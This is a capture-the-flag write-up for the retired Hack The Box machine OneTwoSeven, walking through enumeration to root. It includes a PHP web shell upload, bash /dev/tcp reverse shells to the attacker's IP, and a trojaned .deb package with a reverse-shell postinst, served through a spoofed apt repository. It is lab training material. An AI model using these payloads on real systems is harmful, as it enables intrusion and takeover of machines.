# OneTwoSeven

This is the write-up for the box OneTwoSeven that got retired at the 31st August 2019.
My IP address was 10.10.14.209 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.133    onetwoseven.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/onetwoseven.nmap 10.10.10.133
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Page moved.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

We get a lot of information on the webpage which not all of it will be relevant. We can read about a IPv6 service that is coming soon.
A SFTP service and DoS protection.

After clicking on _Sign Up_ we get a username and a password for a SFTP service, where we can upload pages via **sftp://onetwoseven.htb** that is hosted on **hxxp://onetwoseven.htb/~ots-2ZWE1MDE/**.
```markdown
Username: ots-2ZWE1MDE
Password: fa6ea501
```

### Checking the SFTP service

We can login with the given credentials on this SFTP service.
```markdown
sftp ots-2ZWE1MDE@10.10.10.133
```

There we find the static HTML file of our webpage and we have the permission to upload files. The application only allows static files and blocks PHP files, so we don't have code execution yet.
By looking at the _help_ we see that we can create symlink. With that we could read files from the server like this:

```markdown
symlink / testpath
```

We created a symbolic link from the root path to a directory on our webpage which means we got access to /etc/passwd on **hxxp://onetwoseven.htb/~ots-2ZWE1MDE/testpath/etc/passwd**.

Let's look for the files in the directory where this web application runs in **hxxp://onetwoseven.htb/~ots-2ZWE1MDE/Testerman/var/www/html-admin/**. 
In this directory we find the file **.login.php.swp** that we can download and examine.
```markdown
file .login.php.swp
```

It says that it is a _VIM swap file_. Such files are created whenever we edit something a VIM but don't quit it gracefully. In these cases the files are kind of caches as this swap files that we can restore.
```markdown
mv login.php.swp .login.php.swp
vim login.php

r (to recover)
```

And now we can read the file.

#### Analyzing the PHP file

This PHP file has some very interesting information:
- If the servers port is _not equal_ to 60080 then close the connection
- Username: ots-admin
- Password: 11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8

The hash we got has 64 characters and is probably a SHA256 hash. We can either crack this manually but we find it on hashes.org:
> Homesweethome1

Let's check for that port with Nmap:
```markdown
nmap -p 60080 10.10.10.133
```

It says it is a filtered port and no other information, so we will use SSH for port forwarding to connect to that port. We found out in the initial Nmap scan that a SSH service is running.

Port forwarding with SSH:
```markdown
ssh -N -L60080:127.0.0.1:60080 ots-2ZWE1MDE@10.10.10.133
```

Explanation:
> -L{local port}:{open socket on this address and :port} opens port 60080 on my local machine to connect to my local address.

The _-N_ parameter is needed because we don't want to execute commands.

After that command we don't get a prompt back but we opened port 60080 on our 127.0.0.1 _(netstat -alnp)_ and thus can visit that site with our browser. This will bring us to the **Administration Backend** where we can try out the credentials we found in the source code and they work.

#### Checking the Administration Backend

Now that we logged in there we can check all the buttons.
- OTS Default User
  - Username: ots-yODc2NGQ
  - Password: f528764d

We can log in via SSH with this user and check his homepage and fortunaly we find **user.txt** in there.

By clicking on the _[DL]_ next to the buttons we can download the PHP source code of the different applications. The only interesting application is the _OTS Addon Manager_. This contains an Apache RewriteEngineRule that says:
```markdown
RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]
RewriteRule ^addon-download.php addons/ots-man-addon.php [L]
```

This looks for **addon-upload.php** and always rewrites it with **ots-man-addon.php** (which is the current page) and then [L] stops all processing rules after that. The source code for **ots-man-addon.php** shows us how this and the download of the source codes works and we will trick this to execute code.

First we need to upload a random file. To activate the _Submit Query_ button, we open the Developer Tools and remove the part with _disabled="disabled"_ and send the request to Burpsuites Repeater.

Change the method and path to:
```markdown
POST /addon-download.php&/addon-upload.php HTTP/1.1
```
Change the filename to:
```markdown
test.php
```
Change request to:
```PHP
<?php system($_REQUEST['Message']); ?>
```

Send it and if we get _File uploaded successfully_ then we can execute the uploaded PHP file. This file can be found here:
> localhost:60080/addons/test.php

Now we get a blank page and will try out the query with a whoami command:
```markdown
localhost:60080/addons/test.php?Message=whoami
```

This gives us _www-admin-data_ and this means we have code execution and can start a reverse shell.
```markdown
Message=bash -c 'bash -i >& /dev/tcp/10.10.14.209/9001 0>&1'

URL-encoded:
Message=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.209/9001+0>%261'
```

## Privilege Escalation

After we started a reverse shell on the box, we are logged in as www-admin-data and can enumerate the machine. By enumerating we will find that this user got some commands to start with root privileges:
```markdown
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

The commands **sudo apt-get update** and **sudo apt-get upgrade** can be executed with root privileges with this user. The first thing to check is GTFObins to bypass local security restrictions but unfortunately it does not have any command to abuse this commands. Interestingly though the commands will keep the proxy settings when executing them.

If we just run the command we get this line that could be useful:
> W: Failed to fetch hxxp://packages.onetwoseven.htb/devuan/dists/ascii/InRelease  Temporary failure resolving 'packages.onetwoseven.htb'

And if we check the sources for apt at **/etc/apt/sources.list.d/** we find **onetwoseven.list** as a source. We will set up a proxy and imitate this source to upload our own "updates" on the box to execute commands.

### Setting up a proxy and an apt source

First we need to set up a new proxy in Burpsuite by clicking on **Options** and **Add** to add a new proxy. The settings will look like this:
```markdown
Bind to port: 8081
Bind to address: Specific address (10.10.14.209)

Redirect to host: 127.0.0.1
Redirect to port: 8000
```

We put **packages.onetwoseven.htb** in our _/etc/hosts_ file:
> 127.0.0.1   localhost packages.onetwoseven.htb

Set up the environment variable for a proxy on the box:
```markdown
export http_proxy="http://10.10.14.209:8081"
```

Start a Python SimpleHTTPServer on port 8000 and we are done with the proxy settings. Now this happens when we execute _sudo apt-get update_:
1. Command goes through the proxy (10.10.14.209:8081) we set up in Burpsuite
2. Gets redirected to our localhost (127.0.0.1:8000)
3. Hits the SimpleHTTPServer that runs on port 8000

After executing _sudo apt-get update_ we can see that, that the server never validated with a _Release_ file and will trust every source the packages come from:
> The repository 'hxxp://packages.onetwoseven.htb/devuan ascii Release' does not have a Release file.

We can analyze the correct path where it wants the packages from in Burpsuite and we see the correct path is **/devuan/dists/ascii/main/binary-amd64/**.


### Creating the apt package

We need to create this directory in the path where our SimpleHTTPServer is running:
```markdown
mkdir /ascii/main/binary-amd64/*
```

Listing every installed package on the box with **dpkg -l** we can take any package that doesn't need a service restart. In my case I will take _telnet_ that is on version 0.17-41 and runs on amd64 on this box.

Then we get an example packages file to recreate a malicious one. The host where those packages come from can be found in Burpsuite:
> hxxp://deb.devuan.org//devuan/dists/ascii/main/binary-amd64/

Download the **Packages.gz** and unzip it:
```markdown
gunzip Packages.gz
```

We delete the content from the Packages file and put our own content in:
```markdown
Package: telnet
Version: 0.18-2001
Maintainer: Testerman
Architecture: amd64
Description: Download this
Section: all
Priority: required
Filename: telnet.deb
Size: 44650
SHA256: a9b89c7ceb88fc684db6994a85771777eeb9238c5ab7c93bdfbf15dd4974a54d
```

The _Version_ has to be higher than the original one the _Size_ and _SHA256_ will be changed soon.

The next files we need are a **control** and **postinst** file. Those are placed in the folder _DEBIAN_.
Create a file named **control** and put this in:
```markdown
Package: telnet
Maintainer: Testerman
Version: 0.18-2001
Architecture: amd64
Description: Download this
```

Create a file named **postinst** and put this in:
```markdown
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.209/9001 0>&1'
```

This will be executed after the installation of the package so it has to have the execute permission set:
```markdown
chmod 755 postinst
```

Build the package:
```markdown
dpgk-deb --build telnet/
```

This created the file **telnet.deb** that we need the _Size_ and the _SHA256_ hashsum to put in the Packages file.
```markdown
du -b telnet.deb

sha256sum telnet.deb
```

After finishing the Package file we can compress it again:
```markdown
gzip Packages
```

Our file structure looks like this now:
```markdown
devuan/dists/ascii/main/binary-amd64/telnet.deb
devuan/dists/ascii/main/binary-amd64/Packages.gz
devuan/dists/ascii/main/binary-amd64/telnet/DEBIAN/control
devuan/dists/ascii/main/binary-amd64/telnet/DEBIAN/postinst
```

Now we start a listener on port 9001 and execute the command **apt-get update**. This will find the file from our server and after executing **sudo apt-get upgrade**, we get a reverse shell as root!
